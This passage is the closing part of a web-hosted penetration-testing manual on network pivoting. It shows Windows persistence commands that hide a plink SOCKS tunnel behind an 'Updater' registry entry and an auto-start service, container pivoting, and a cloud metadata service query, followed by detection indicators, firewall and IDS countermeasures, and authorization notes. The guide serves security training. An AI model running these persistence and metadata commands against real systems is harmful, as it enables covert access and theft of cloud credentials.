style="color:#F8F8F2"><span class="token string" style="color:rgb(255, 121, 198)">WantedBy=multi-user.target</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token string" style="color:rgb(255, 121, 198)">EOF</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="152-windows-specific-implementations">15.2 Windows-Specific Implementations<a href="#152-windows-specific-implementations" class="hash-link" aria-label="Direct link to 15.2 Windows-Specific Implementations" title="Direct link to 15.2 Windows-Specific Implementations" translate="no">‚Äã</a></h3>
<div class="language-cmd codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-cmd codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">REM Registry-based persistence</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">reg add &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run&quot; /v &quot;Updater&quot; /t REG_SZ /d &quot;plink.exe -ssh -D 9050 -N user@server&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">REM Service creation for persistence</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sc create TunnelService binPath= &quot;C:\Windows\System32\plink.exe -ssh -D 9050 -N user@server&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sc config TunnelService start= auto</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="153-container-and-cloud-environments">15.3 Container and Cloud Environments<a href="#153-container-and-cloud-environments" class="hash-link" aria-label="Direct link to 15.3 Container and Cloud Environments" title="Direct link to 15.3 Container and Cloud Environments" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Docker container pivoting</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">docker</span><span class="token plain"> run </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-d</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--network</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">host</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-v</span><span class="token plain"> /tmp:/tmp tunnel-image</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Kubernetes pod networking</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">kubectl port-forward pod/pivot-pod </span><span class="token number">8080</span><span class="token plain">:80</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Cloud metadata service tunneling</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">curl</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-H</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;Metadata-Flavor: Google&quot;</span><span class="token plain"> http://169.254.169.254/computeMetadata/v1/instance/</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="16-monitoring-and-defensive-considerations">16. Monitoring and Defensive Considerations<a href="#16-monitoring-and-defensive-considerations" class="hash-link" aria-label="Direct link to 16. Monitoring and Defensive Considerations" title="Direct link to 16. Monitoring and Defensive Considerations" translate="no">‚Äã</a></h2>
<div class="theme-admonition theme-admonition-note admonition_xJq3 alert alert--secondary"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M6.3 5.69a.942.942 0 0 1-.28-.7c0-.28.09-.52.28-.7.19-.18.42-.28.7-.28.28 0 .52.09.7.28.18.19.28.42.28.7 0 .28-.09.52-.28.7a1 1 0 0 1-.7.3c-.28 0-.52-.11-.7-.3zM8 7.99c-.02-.25-.11-.48-.31-.69-.2-.19-.42-.3-.69-.31H6c-.27.02-.48.13-.69.31-.2.2-.3.44-.31.69h1v3c.02.27.11.5.31.69.2.2.42.31.69.31h1c.27 0 .48-.11.69-.31.2-.19.3-.42.31-.69H8V7.98v.01zM7 2.3c-3.14 0-5.7 2.54-5.7 5.68 0 3.14 2.56 5.7 5.7 5.7s5.7-2.55 5.7-5.7c0-3.15-2.56-5.69-5.7-5.69v.01zM7 .98c3.86 0 7 3.14 7 7s-3.14 7-7 7-7-3.12-7-7 3.14-7 7-7z"></path></svg></span>note</div><div class="admonitionContent_BuS1"><p>Defensive strategies and detection patterns provided here are examples; always tune IDS/IPS and SIEM rules to your organizational network profile and risk posture.</p></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="161-detection-signatures">16.1 Detection Signatures<a href="#161-detection-signatures" class="hash-link" aria-label="Direct link to 16.1 Detection Signatures" title="Direct link to 16.1 Detection Signatures" translate="no">‚Äã</a></h3>
<p>Network defenders should monitor for the following indicators:</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="connection-pattern-analysis">Connection Pattern Analysis:<a href="#connection-pattern-analysis" class="hash-link" aria-label="Direct link to Connection Pattern Analysis:" title="Direct link to Connection Pattern Analysis:" translate="no">‚Äã</a></h4>
<ul>
<li>Unusual outbound connections on common ports (22, 80, 443)</li>
<li>High-frequency connection attempts with regular intervals</li>
<li>Connections to external hosts from internal segments</li>
<li>Abnormal bandwidth utilization patterns</li>
</ul>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="protocol-analysis">Protocol Analysis:<a href="#protocol-analysis" class="hash-link" aria-label="Direct link to Protocol Analysis:" title="Direct link to Protocol Analysis:" translate="no">‚Äã</a></h4>
<ul>
<li>SSH connections with unusual keep-alive patterns</li>
<li>HTTP traffic with suspicious user agents or headers</li>
<li>DNS queries to unusual domains or with high frequency</li>
<li>TLS connections to self-signed or suspicious certificates</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="162-defensive-countermeasures">16.2 Defensive Countermeasures<a href="#162-defensive-countermeasures" class="hash-link" aria-label="Direct link to 16.2 Defensive Countermeasures" title="Direct link to 16.2 Defensive Countermeasures" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Network segmentation enforcement</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">iptables </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-A</span><span class="token plain"> FORWARD </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-s</span><span class="token plain"> </span><span class="token number">192.168</span><span class="token plain">.100.0/24 </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-d</span><span class="token plain"> </span><span class="token number">192.168</span><span class="token plain">.200.0/24 </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-j</span><span class="token plain"> DROP</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Deep packet inspection</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">snort </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-c</span><span class="token plain"> /etc/snort/snort.conf </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-i</span><span class="token plain"> eth0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Connection monitoring</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">netstat</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-antlp</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">grep</span><span class="token plain"> ESTABLISHED </span><span class="token operator">|</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">awk</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;{print $5}&#x27;</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">cut</span><span class="token plain"> -d: </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-f1</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">sort</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">uniq</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-c</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">sort</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-nr</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="17-legal-and-ethical-considerations">17. Legal and Ethical Considerations<a href="#17-legal-and-ethical-considerations" class="hash-link" aria-label="Direct link to 17. Legal and Ethical Considerations" title="Direct link to 17. Legal and Ethical Considerations" translate="no">‚Äã</a></h2>
<div class="theme-admonition theme-admonition-note admonition_xJq3 alert alert--secondary"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M6.3 5.69a.942.942 0 0 1-.28-.7c0-.28.09-.52.28-.7.19-.18.42-.28.7-.28.28 0 .52.09.7.28.18.19.28.42.28.7 0 .28-.09.52-.28.7a1 1 0 0 1-.7.3c-.28 0-.52-.11-.7-.3zM8 7.99c-.02-.25-.11-.48-.31-.69-.2-.19-.42-.3-.69-.31H6c-.27.02-.48.13-.69.31-.2.2-.3.44-.31.69h1v3c.02.27.11.5.31.69.2.2.42.31.69.31h1c.27 0 .48-.11.69-.31.2-.19.3-.42.31-.69H8V7.98v.01zM7 2.3c-3.14 0-5.7 2.54-5.7 5.68 0 3.14 2.56 5.7 5.7 5.7s5.7-2.55 5.7-5.7c0-3.15-2.56-5.69-5.7-5.69v.01zM7 .98c3.86 0 7 3.14 7 7s-3.14 7-7 7-7-3.12-7-7 3.14-7 7-7z"></path></svg></span>note</div><div class="admonitionContent_BuS1"><p>All activities must be performed with explicit written authorization. Always maintain thorough documentation and comply with all relevant legal and ethical standards for your jurisdiction and engagement.</p></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="171-authorization-requirements">17.1 Authorization Requirements<a href="#171-authorization-requirements" class="hash-link" aria-label="Direct link to 17.1 Authorization Requirements" title="Direct link to 17.1 Authorization Requirements" translate="no">‚Äã</a></h3>
<p>All pivoting techniques described in this manual must only be employed within the scope of:</p>
<ul>
<li>Authorized penetration testing engagements</li>
<li>Red team exercises with explicit approval</li>
<li>Security research in controlled environments</li>
<li>Defensive security training and education</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="172-documentation-requirements">17.2 Documentation Requirements<a href="#172-documentation-requirements" class="hash-link" aria-label="Direct link to 17.2 Documentation Requirements" title="Direct link to 17.2 Documentation Requirements" translate="no">‚Äã</a></h3>
<p>Comprehensive documentation must include:</p>
<ul>
<li>Scope of testing authorization</li>
<li>Network segments accessed through pivoting</li>
<li>Tools and techniques employed</li>
<li>Timeline of pivoting activities</li>
<li>Data accessed or modified during testing</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="18-conclusion">18. Conclusion<a href="#18-conclusion" class="hash-link" aria-label="Direct link to 18. Conclusion" title="Direct link to 18. Conclusion" translate="no">‚Äã</a></h2>
<p>This comprehensive reference manual provides an exhaustive analysis of network pivoting methodologies across multiple platforms and use cases. The techniques described represent the current state-of-the-art in adversarial network traversal, providing cybersecurity professionals with the knowledge necessary to both implement and defend against sophisticated pivoting attacks.</p>
<p>The evolution of pivoting tools toward more sophisticated evasion capabilities, exemplified by frameworks such as Ligolo-ng, Havoc C2, Villain, and Sliver, demonstrates the ongoing arms race between offensive and defensive capabilities. Future research should focus on machine learning-based traffic analysis evasion, quantum-resistant encryption for long-term operations, and integration with cloud-native architectures.</p>
<p>Security practitioners must balance the offensive capabilities described herein with robust defensive measures, comprehensive monitoring, and adherence to ethical guidelines to ensure the responsible advancement of cybersecurity knowledge and capabilities.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="references">References<a href="#references" class="hash-link" aria-label="Direct link to References" title="Direct link to References" translate="no">‚Äã</a></h2>
<ol>
<li><a href="https://datatracker.ietf.org/doc/html/rfc760" target="_blank" rel="noopener noreferrer">Postel, J. (1980). Internet Protocol - DARPA Internet Program Protocol Specification. RFC 760.</a></li>
<li><a href="https://datatracker.ietf.org/doc/html/rfc4251" target="_blank" rel="noopener noreferrer">Ylonen, T. &amp; Lonvick, C. (2006). The Secure Shell (SSH) Protocol Architecture. RFC 4251.</a></li>
<li><a href="https://datatracker.ietf.org/doc/html/rfc1928" target="_blank" rel="noopener noreferrer">Leech, M. et al. (1996). SOCKS Protocol Version 5. RFC 1928.</a></li>
<li><a href="https://docs.metasploit.com/" target="_blank" rel="noopener noreferrer">Metasploit Framework Documentation. Rapid7.</a></li>
<li><a href="https://github.com/jpillora/chisel" target="_blank" rel="noopener noreferrer">Chisel Project Repository.</a></li>
<li><a href="https://github.com/nicocha30/ligolo-ng" target="_blank" rel="noopener noreferrer">Ligolo-ng Technical Documentation.</a></li>
<li><a href="https://github.com/HavocFramework/Havoc" target="_blank" rel="noopener noreferrer">Havoc C2 Framework.</a></li>
<li><a href="https://github.com/t3l3machus/Villain" target="_blank" rel="noopener noreferrer">Villain Framework Repository.</a></li>
<li><a href="https://sliver.sh/" target="_blank" rel="noopener noreferrer">Sliver Framework Documentation.</a></li>
<li><a href="https://www.openssh.com/manual.html" target="_blank" rel="noopener noreferrer">OpenSSH Manual Pages.</a></li>
<li><a href="https://hideandsec.sh/books/cheatsheets-82c/page/pivoting" target="_blank" rel="noopener noreferrer">Pivoting. HideandSec.</a></li>
<li><a href="https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-115.pdf" target="_blank" rel="noopener noreferrer">NIST Special Publication 800-115: Technical Guide to Information Security Testing and Assessment.</a></li>
<li><a href="https://owasp.org/www-project-web-security-testing-guide/" target="_blank" rel="noopener noreferrer">OWASP Testing Guide v4.0: Web Application Security Testing.</a></li>
<li><a href="https://github.com/BishopFox/sliver/wiki/Pivots" target="_blank" rel="noopener noreferrer">BishopFox Sliver Wiki: Pivots.</a></li>
</ol></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-tags-row"><div class="col"><b>Tags:</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/tags/pivoting">Pivoting</a></li></ul></div></div><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col"><a href="https://github.com/gl0bal01/gl0bal01.github.io/tree/main/docs/cyber/pivoting_guide.md" target="_blank" rel="noopener noreferrer" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>Edit this page</a></div><div class="col lastUpdated_JAkA"><span class="theme-last-updated">Last updated<!-- --> on <b><time datetime="2025-06-12T15:15:33.000Z" itemprop="dateModified">Jun 12, 2025</time></b></span></div></div></footer></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/cyber"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Cyber</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/cyber/password-cracking-guide"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Password Cracking</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#abstract" class="table-of-contents__link toc-highlight">Abstract</a></li><li><a href="#1-introduction" class="table-of-contents__link toc-highlight">1. Introduction</a><ul><li><a href="#11-pivoting-taxonomy" class="table-of-contents__link toc-highlight">1.1 Pivoting Taxonomy</a></li><li><a href="#12-common-pivoting-scenarios" class="table-of-contents__link toc-highlight">1.2 Common Pivoting Scenarios</a></li><li><a href="#13-evaluation-framework" class="table-of-contents__link toc-highlight">1.3 Evaluation Framework</a></li><li><a href="#14-tool-selection-decision-framework" class="table-of-contents__link toc-highlight">1.4 Tool Selection Decision Framework</a></li></ul></li><li><a href="#2-ssh-based-pivoting-methodologies" class="table-of-contents__link toc-highlight">2. SSH-Based Pivoting Methodologies</a><ul><li><a href="#21-local-port-forwarding" class="table-of-contents__link toc-highlight">2.1 Local Port Forwarding</a></li><li><a href="#22-remote-port-forwarding" class="table-of-contents__link toc-highlight">2.2 Remote Port Forwarding</a></li><li><a href="#23-dynamic-port-forwarding-socks-proxy" class="table-of-contents__link toc-highlight">2.3 Dynamic Port Forwarding (SOCKS Proxy)</a></li><li><a href="#24-advanced-ssh-configuration" class="table-of-contents__link toc-highlight">2.4 Advanced SSH Configuration</a></li><li><a href="#25-ssh-tunneling-through-http-proxies" class="table-of-contents__link toc-highlight">2.5 SSH Tunneling Through HTTP Proxies</a></li></ul></li><li><a href="#3-chisel-framework-http-tunneled-network-pivoting" class="table-of-contents__link toc-highlight">3. Chisel Framework: HTTP-Tunneled Network Pivoting</a><ul><li><a href="#31-server-configuration-and-management" class="table-of-contents__link toc-highlight">3.1 Server Configuration and Management</a></li><li><a href="#32-client-configuration-methodologies" class="table-of-contents__link toc-highlight">3.2 Client Configuration Methodologies</a></li><li><a href="#33-advanced-chisel-configurations" class="table-of-contents__link toc-highlight">3.3 Advanced Chisel Configurations</a></li></ul></li><li><a href="#4-ligolo-ng-transparent-network-tunneling" class="table-of-contents__link toc-highlight">4. Ligolo-ng: Transparent Network Tunneling</a><ul><li><a href="#41-infrastructure-setup-and-configuration" class="table-of-contents__link toc-highlight">4.1 Infrastructure Setup and Configuration</a></li><li><a href="#42-session-management-and-network-configuration" class="table-of-contents__link toc-highlight">4.2 Session Management and Network Configuration</a></li><li><a href="#43-advanced-tunneling-features" class="table-of-contents__link toc-highlight">4.3 Advanced Tunneling Features</a></li></ul></li><li><a href="#5-metasploit-framework-comprehensive-pivoting-integration" class="table-of-contents__link toc-highlight">5. Metasploit Framework: Comprehensive Pivoting Integration</a><ul><li><a href="#51-session-based-routing-configuration" class="table-of-contents__link toc-highlight">5.1 Session-Based Routing Configuration</a></li><li><a href="#52-socks-proxy-implementation" class="table-of-contents__link toc-highlight">5.2 SOCKS Proxy Implementation</a></li><li><a href="#53-port-forwarding-mechanisms" class="table-of-contents__link toc-highlight">5.3 Port Forwarding Mechanisms</a></li><li><a href="#54-advanced-metasploit-pivoting-techniques" class="table-of-contents__link toc-highlight">5.4 Advanced Metasploit Pivoting Techniques</a></li></ul></li><li><a href="#6-havoc-c2-modern-command-and-control-pivoting" class="table-of-contents__link toc-highlight">6. Havoc C2: Modern Command and Control Pivoting</a><ul><li><a href="#61-agent-deployment-and-configuration" class="table-of-contents__link toc-highlight">6.1 Agent Deployment and Configuration</a></li><li><a href="#62-tcp-pivot-implementation" class="table-of-contents__link toc-highlight">6.2 TCP Pivot Implementation</a></li><li><a href="#63-socks-proxy-configuration" class="table-of-contents__link toc-highlight">6.3 SOCKS Proxy Configuration</a></li><li><a href="#64-advanced-havoc-pivoting-features" class="table-of-contents__link toc-highlight">6.4 Advanced Havoc Pivoting Features</a></li></ul></li><li><a href="#7-villain-framework-collaborative-c2-with-session-sharing" class="table-of-contents__link toc-highlight">7. Villain Framework: Collaborative C2 with Session Sharing</a><ul><li><a href="#71-framework-installation-and-setup" class="table-of-contents__link toc-highlight">7.1 Framework Installation and Setup</a></li><li><a href="#72-payload-generation-and-management" class="table-of-contents__link toc-highlight">7.2 Payload Generation and Management</a></li><li><a href="#73-session-management-and-interaction" class="table-of-contents__link toc-highlight">7.3 Session Management and Interaction</a></li><li><a href="#74-collaborative-features-and-sibling-servers" class="table-of-contents__link toc-highlight">7.4 Collaborative Features and Sibling Servers</a></li><li><a href="#75-advanced-villain-techniques" class="table-of-contents__link toc-highlight">7.5 Advanced Villain Techniques</a></li><li><a href="#76-hoaxshell-integration" class="table-of-contents__link toc-highlight">7.6 HoaxShell Integration</a></li></ul></li><li><a href="#8-sliver-framework-modern-go-based-c2-with-advanced-pivoting" class="table-of-contents__link toc-highlight">8. Sliver Framework: Modern Go-Based C2 with Advanced Pivoting</a><ul><li><a href="#81-server-setup-and-configuration" class="table-of-contents__link toc-highlight">8.1 Server Setup and Configuration</a></li><li><a href="#82-listener-configuration" class="table-of-contents__link toc-highlight">8.2 Listener Configuration</a></li><li><a href="#83-implant-generation" class="table-of-contents__link toc-highlight">8.3 Implant Generation</a></li><li><a href="#84-pivoting-and-network-tunneling" class="table-of-contents__link toc-highlight">8.4 Pivoting and Network Tunneling</a></li><li><a href="#85-advanced-sliver-operations" class="table-of-contents__link toc-highlight">8.5 Advanced Sliver Operations</a></li><li><a href="#86-beacon-management" class="table-of-contents__link toc-highlight">8.6 Beacon Management</a></li><li><a href="#87-detection-evasion-features" class="table-of-contents__link toc-highlight">8.7 Detection Evasion Features</a></li><li><a href="#88-multi-hop-pivot-chains" class="table-of-contents__link toc-highlight">8.8 Multi-Hop Pivot Chains</a></li></ul></li><li><a href="#9-windows-specific-pivoting-tools" class="table-of-contents__link toc-highlight">9. Windows-Specific Pivoting Tools</a><ul><li><a href="#91-netsh-port-forwarding" class="table-of-contents__link toc-highlight">9.1 Netsh Port Forwarding</a></li><li><a href="#92-plink-putty-link-implementation" class="table-of-contents__link toc-highlight">9.2 Plink (PuTTY Link) Implementation</a></li><li><a href="#93-powershell-based-pivoting" class="table-of-contents__link toc-highlight">9.3 PowerShell-Based Pivoting</a></li></ul></li><li><a href="#10-cross-platform-tunneling-solutions" class="table-of-contents__link toc-highlight">10. Cross-Platform Tunneling Solutions</a><ul><li><a href="#101-rpivot-http-based-tunneling" class="table-of-contents__link toc-highlight">10.1 rpivot: HTTP-Based Tunneling</a></li><li><a href="#102-regeorg-web-application-tunneling" class="table-of-contents__link toc-highlight">10.2 reGeorg: Web Application Tunneling</a></li><li><a href="#103-stunnel-tls-encryption-wrapper" class="table-of-contents__link toc-highlight">10.3 Stunnel: TLS Encryption Wrapper</a></li><li><a href="#104-dnscat2-dns-tunneling" class="table-of-contents__link toc-highlight">10.4 dnscat2: DNS Tunneling</a></li></ul></li><li><a href="#11-socat-swiss-army-knife-of-network-relays" class="table-of-contents__link toc-highlight">11. Socat: Swiss Army Knife of Network Relays</a><ul><li><a href="#111-basic-relay-configurations" class="table-of-contents__link toc-highlight">11.1 Basic Relay Configurations</a></li><li><a href="#112-encrypted-tunneling" class="table-of-contents__link toc-highlight">11.2 Encrypted Tunneling</a></li><li><a href="#113-advanced-socat-implementations" class="table-of-contents__link toc-highlight">11.3 Advanced Socat Implementations</a></li></ul></li><li><a href="#12-proxychains-transparent-proxy-integration" class="table-of-contents__link toc-highlight">12. Proxychains: Transparent Proxy Integration</a><ul><li><a href="#121-configuration-management" class="table-of-contents__link toc-highlight">12.1 Configuration Management</a></li><li><a href="#122-chain-configuration-types" class="table-of-contents__link toc-highlight">12.2 Chain Configuration Types</a></li><li><a href="#123-application-integration" class="table-of-contents__link toc-highlight">12.3 Application Integration</a></li></ul></li><li><a href="#13-advanced-pivot-chaining-methodologies" class="table-of-contents__link toc-highlight">13. Advanced Pivot Chaining Methodologies</a><ul><li><a href="#131-multi-hop-architecture-design" class="table-of-contents__link toc-highlight">13.1 Multi-Hop Architecture Design</a></li><li><a href="#132-hierarchical-routing-implementation" class="table-of-contents__link toc-highlight">13.2 Hierarchical Routing Implementation</a></li><li><a href="#133-cascade-tunneling-example" class="table-of-contents__link toc-highlight">13.3 Cascade Tunneling Example</a></li></ul></li><li><a href="#14-detection-evasion-and-operational-security" class="table-of-contents__link toc-highlight">14. Detection Evasion and Operational Security</a><ul><li><a href="#141-operational-timeline-and-evasion-strategy" class="table-of-contents__link toc-highlight">14.1 Operational Timeline and Evasion Strategy</a></li><li><a href="#142-traffic-analysis-evasion" class="table-of-contents__link toc-highlight">14.2 Traffic Analysis Evasion</a></li><li><a href="#142-behavioral-analysis-evasion" class="table-of-contents__link toc-highlight">14.2 Behavioral Analysis Evasion</a></li><li><a href="#143-memory-only-operations" class="table-of-contents__link toc-highlight">14.3 Memory-Only Operations</a></li><li><a href="#144-advanced-evasion-techniques" class="table-of-contents__link toc-highlight">14.4 Advanced Evasion Techniques</a></li></ul></li><li><a href="#15-platform-specific-implementation-considerations" class="table-of-contents__link toc-highlight">15. Platform-Specific Implementation Considerations</a><ul><li><a href="#151-linux-specific-techniques" class="table-of-contents__link toc-highlight">15.1 Linux-Specific Techniques</a></li><li><a href="#152-windows-specific-implementations" class="table-of-contents__link toc-highlight">15.2 Windows-Specific Implementations</a></li><li><a href="#153-container-and-cloud-environments" class="table-of-contents__link toc-highlight">15.3 Container and Cloud Environments</a></li></ul></li><li><a href="#16-monitoring-and-defensive-considerations" class="table-of-contents__link toc-highlight">16. Monitoring and Defensive Considerations</a><ul><li><a href="#161-detection-signatures" class="table-of-contents__link toc-highlight">16.1 Detection Signatures</a></li><li><a href="#162-defensive-countermeasures" class="table-of-contents__link toc-highlight">16.2 Defensive Countermeasures</a></li></ul></li><li><a href="#17-legal-and-ethical-considerations" class="table-of-contents__link toc-highlight">17. Legal and Ethical Considerations</a><ul><li><a href="#171-authorization-requirements" class="table-of-contents__link toc-highlight">17.1 Authorization Requirements</a></li><li><a href="#172-documentation-requirements" class="table-of-contents__link toc-highlight">17.2 Documentation Requirements</a></li></ul></li><li><a href="#18-conclusion" class="table-of-contents__link toc-highlight">18. Conclusion</a></li><li><a href="#references" class="table-of-contents__link toc-highlight">References</a></li></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="footer__copyright">¬© 2025 gl0bal01. Built with Docusaurus.</div></div></div></footer></div>
</body>
</html>